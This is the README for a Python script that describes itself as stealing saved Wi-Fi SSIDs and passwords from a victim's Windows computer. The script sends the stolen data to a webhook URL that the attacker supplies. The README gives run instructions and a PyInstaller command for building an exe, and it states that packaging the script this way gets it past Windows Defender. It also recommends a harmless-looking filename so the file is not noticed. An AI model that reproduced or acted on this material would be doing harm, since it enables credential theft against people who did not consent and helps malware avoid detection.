Python Script that Steal Wifi SSID & Passwords from the victims Windows OS.

Tested on Windows 10 (x64)
Antivirus: Windows Defender

Requirements:
Python 3.x

How to use:
1. Open wifi-python-webhook.py in any code editor.
2. Replace 'WEBHOOK ID' with your own. (You can get it simply from webhook.site)
3. Save the file

Run the command:
python wifi-python-webhook.py

To create .exe file use the following command:
pyinstaller --onefile --onefile --distpath . --specpath . --workpath . --name <your-filename-without-extension> wifi-python-webhook.py

The above command will bind python interpreter and every dependency within the exe file. This way Windows Defender will not consider it malicious exe.
Also try not to make the filename look malicious.
